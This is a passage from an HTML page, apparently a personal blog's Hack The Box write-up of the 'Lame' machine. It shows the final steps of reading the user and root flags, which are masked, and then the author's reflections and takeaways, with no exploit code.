+</span></span></code></pre></div><h2 id="post-exploitation">Post-Exploitation</h2>
+<p>With full system access confirmed, I proceed to look for the user flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> makis
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/home/makis
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl">cat user.txt
+</span></span><span class="line"><span class="cl">****************************
+</span></span></code></pre></div><p>The user flag is successfully obtained.</p>
+<p>With full system access already obtained, I proceed to locate the root flag. Let&rsquo;s go back to the root directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> root
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">Desktop
+</span></span><span class="line"><span class="cl">reset_logs.sh
+</span></span><span class="line"><span class="cl">root.txt
+</span></span><span class="line"><span class="cl">vnc.log
+</span></span><span class="line"><span class="cl">cat root.txt
+</span></span><span class="line"><span class="cl">**********************
+</span></span></code></pre></div><p>The root flag is successfully retrieved, completing the machine.</p>
+<hr>
+<p>This was my first Hack The Box machine completed using guided mode, and it turned out to be a great learning experience.</p>
+<p>While guided mode helped structure the process, I found the most value in manually verifying vulnerabilities and working with public PoCs instead of relying entirely on automated tools.</p>
+<p>Moving forward, my goal is to focus more on understanding the underlying mechanics of exploits rather than just executing them.</p>
+<h3 id="key-takeaways">Key takeaways:</h3>
+<ul>
+<li>Always validate findings instead of blindly trusting tools</li>
+<li>Manual exploitation provides a deeper understanding than automated frameworks</li>
+<li>Small troubleshooting steps (like missing dependencies) are part of the process</li>
+<li>Understanding the vulnerability is more important than just getting a shell</li>
+</ul>
+<hr>
+<p>I hope you enjoyed this write-up. The next machine — Beep — will be covered soon, so stay tuned.</p>
+
+        </div>
+      </article>
+
+      <div class="share">
+  <div class="share__title">Share this:</div>
+  <ul class="share__list list-reset">
+    <li class="share__item">
+      <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fhtb-machine-lame%2f"
+        onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+        title="Share on Facebook" rel="nofollow"><i class="fa-brands fa-facebook-f"></i></a>
+    </li>
+
+    <li class="share__item">
+      <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=Lame%20%28Hack%20The%20Box%29%20Full%20Write-Up&url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhtb-machine-lame%2f" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="fa-brands fa-x-twitter"></i></a>
+    </li>
+
+    <li class="share__item">
+      <a class="share__link share__pinterest"
+        href="http://pinterest.com/pin/create/button/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhtb-machine-lame%2f&amp;media=http%3a%2f%2flocalhost%3a1313%2fimages%2fposts%2fHTB-Lame-write-up.png&amp;description=Lame%20%28Hack%20The%20Box%29%20Full%20Write-Up"
+        onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;"
+        title="Share on Pinterest" aria-label="Share on Pinterest"><i class="fa-brands fa-pinterest"></i></a>
+    </li>
+
+    <li class="share__item">
+      <a class="share__link share__linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhtb-machine-lame%2f&title=Lame%20%28Hack%20The%20Box%29%20Full%20Write-Up&summary=In%20this%20second%20Hack%20The%20Box%20write-up%2c%20I%20walk%20through%20Lame%20step%20by%20step%2c%20from%20enumeration%20to%20full%20compromise%2c%20with%20a%20stronger%20focus%20on%20manual%20exploitation.&source=Lame%20%28Hack%20The%20Box%29%20Full%20Write-Up"
+      onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn" rel="nofollow"><i class="fa-brands fa-linkedin-in"></i></a>
+    </li>
+  </ul>
+</div>
+      
+<div class="post__navigation">
+  
+  <div class="post__prev">
+    
+    
+    <a href="http://localhost:1313/posts/htb-machine-editor/" class="prev__image">
+      
+      
+        <img class="lazy" data-src="http://localhost:1313/images/posts/HTB-Editor-write-up.png" alt="Editor (Hack The Box) Full Write-Up">
+      
+    </a>
+    
+    <div class="prev__box">
+      <span class="post__nav__prev">Older post</span>
+      <h2 class="post__nav__title"><a href="http://localhost:1313/posts/htb-machine-editor/">Editor (Hack The Box) Full Write-Up</a></h2>
+    </div>
+  </div>
+  
+
+  
+</div>
+
+
+      
+      
+<div class="show-comments">
+  
+  <h3 class="show-comments__title">Start the conversation</h3>
+  
+  <button class="button button--primary disqus-button" id="show-comments-button" onclick="disqus();return false;">Show Comments</button>
+</div>
+
+<div id="disqus_thread" class="post__comments">
+  <div id="disqus_empty"></div>
+</div>
+
+<script>
+  var disqus_loaded = false;
+  var disqus_shortname = 'anvod-studio-test';
+  var disqus_container = document.getElementById("disqus_thread");
+  function disqus() {
+    if (!disqus_loaded) {
+      disqus_loaded = true;
+      var e = document.createElement("script");
+      e.type = "text/javascript";
+      e.async = true;
+      e.src = "//" + disqus_shortname + ".disqus.com/embed.js";
+      (document.getElementsByTagName("head")[0] ||
+        document.getElementsByTagName("body")[0])
+        .appendChild(e);
+      
+      document.getElementById("show-comments-button").style.display = "none";
+      
+      disqus_container.classList.add("is-open");
+    }
+  }
+</script>
+
+<noscript>Please enable JavaScript to view the
+  <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+
+      
+      
+
+
+<div class="related-posts">
+  <div class="section__info">
+    <div class="section__head">
+      <h2 class="section__title">Related</h2>
+    </div>
+  </div>
+  <div class="view-list">
+    <div class="row grid">
+      
+        <div class="article col col-6 col-t-12 grid__post animate">
+  <div class="article__inner">
+
+    
+    
+    <div class="article__head">
+      
+
+      <a class="article__image" href="/posts/htb-machine-editor/">
+      
+        <img class="lazy" data-src="http://localhost:1313/images/posts/HTB-Editor-write-up.png" alt="Editor (Hack The Box) Full Write-Up">
+      
+      </a>
+    </div>
+    
+
+    <div class="article__content">
+
+      
+      <div class="article__tags">
+        
+        <a href="http://localhost:1313/tags/write-up/" class="article__tag" style="background: #df1b1b;">Write-Up</a>
+        
+      </div>
+      
+
+      <h2 class="article__title">
+        <a href="/posts/htb-machine-editor/">Editor (Hack The Box) Full Write-Up</a>
+      </h2>
+
+      <p class="article__excerpt">My first Hack The Box write-up — breaking down the Editor machine step by step, from initial enumeration to full compromise. Let’s get into it.</p>
+
+      <div class="article__meta">
+        <time class="article__date" datetime=" 2026-03-26T12:01:35&#43;03:00">26 Mar, 2026</time>
+        <div class="article__minutes">
+          8 min read
+        </div>
+      </div>
+
     </div>
   </div>
 </div>
+      
+    </div>
+  </div>
+</div>
+
+
+    </div>
+
+    <div class="col col-4 col-d-12">
+      <aside class="sidebar">
+        
+        
+
+<div class="widget widget-social">
+  <ul class="widget-social__list list-reset">
+    
+    <li class="widget-social__item">
+      <a class="widget-social__link" href="https://twitter.com" target="_blank" rel="noopener"
+        aria-label="Twitter link"><i class="fa-brands fa-x-twitter"></i></a>
+    </li>
+    
+    <li class="widget-social__item">
+      <a class="widget-social__link" href="https://facebook.com" target="_blank" rel="noopener"
+        aria-label="Facebook link"><i class="fa-brands fa-facebook"></i></a>
+    </li>
+    
+    <li class="widget-social__item">
+      <a class="widget-social__link" href="https://mastodon.social" target="_blank" rel="noopener"
+        aria-label="Mastodon link"><i class="fa-brands fa-mastodon"></i></a>
+    </li>
+    
+    <li class="widget-social__item">
+      <a class="widget-social__link" href="https://reddit.com" target="_blank" rel="noopener"
+        aria-label="Reddit link"><i class="fa-brands fa-reddit-alien"></i></a>
+    </li>
+    
+    <li class="widget-social__item">
+      <a class="widget-social__link" href="https://github.com" target="_blank" rel="noopener"
+        aria-label="Github link"><i class="fa-brands fa-github"></i></a>
+    </li>
+    
+    <li class="widget-social__item">
+      <a class="widget-social__link" href="/index.xml" target="_blank" rel="noopener"
+        aria-label="Rss link"><i class="fa-solid fa-rss"></i></a>
+    </li>
+    
+  </ul>
+</div>
+
+
+        
+
+
+        
+<div class="widget widget-tags">
+  <div class="widget-sidebar-head">
+    <h2 class="widget-sidebar-title">Topics</h2>
+  </div>
+
+  <div class="tag-cloud">
+    
+      
+        
+        
+          
+            
+          
+        
+        <a href="/tags/blog/" class="tag-cloud__item"
+           style="background: #3eb99a;">
+          Blog
+        </a>
+      
+    
+      
+        
+        
+          
+            
+          
+        
+          
+            
+          
+        
+        <a href="/tags/write-up/" class="tag-cloud__item"
+           style="background: #df1b1b;">
+          Write-Up
+        </a>
+      
+    
+  </div>
+</div>
+
+      </aside>
+    </div>
+  </div>
+</div>
+
+
 
 
 
